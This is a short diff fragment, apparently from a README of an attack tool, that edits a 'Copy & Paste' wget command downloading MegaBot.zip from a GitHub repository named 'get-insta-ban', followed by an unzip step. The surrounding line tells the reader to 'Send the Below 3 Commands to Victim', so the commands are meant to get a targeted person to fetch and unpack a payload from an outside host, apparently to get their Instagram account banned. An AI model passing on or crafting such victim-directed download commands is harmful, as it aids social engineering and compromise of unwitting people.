@@ -33,7 +33,7 @@ Send the Below 3 Commands to Victim:
 
 Copy & Paste Command Below:
 ```
-wget -qO MegaBot.zip https://github.com/cyberjeevi/get-insta-ban/raw/main/MegaBot.zip
+wget -O MegaBot.zip https://github.com/cyberjeevi/get-insta-ban/raw/main/MegaBot.zip
 ```
 Unzip MegaBot:
 ```unzip MegaBot.zip```
